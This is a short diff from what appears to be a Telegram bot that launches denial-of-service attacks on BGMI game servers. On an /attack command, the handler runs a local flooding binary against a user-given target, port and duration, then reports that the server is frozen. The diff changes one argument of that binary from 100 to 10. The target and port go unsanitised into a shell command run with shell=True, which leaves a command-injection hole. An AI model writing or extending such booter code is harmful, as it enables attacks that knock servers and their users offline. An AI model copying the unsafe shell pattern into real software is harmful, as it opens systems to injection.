@@ -403,7 +403,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                full_command = f"./soul {target} {port} {time} 100"
+                full_command = f"./soul {target} {port} {time} 10"
                 subprocess.run(full_command, shell=True)
                 response = f"💣 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗 💣\n𝗧𝗔𝗥𝗚𝗘𝗧 :- {target}\n🎯 𝗣𝗢𝗥𝗧 :- {port}\n⏰ 𝗧𝗜𝗠𝗘𝗢𝗨𝗧 :- {time} \n🇮🇳 𝗚𝗔𝗠𝗘 𝗕𝗚𝗠𝗜\n\n❄️ 𝗦𝗘𝗥𝗩𝗘𝗥 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗙𝗥𝗘𝗘𝗭𝗘 𝗔𝗦 𝗣𝗘𝗥 𝗧𝗛𝗘 𝗧𝗜𝗠𝗘\n\n"
         else:
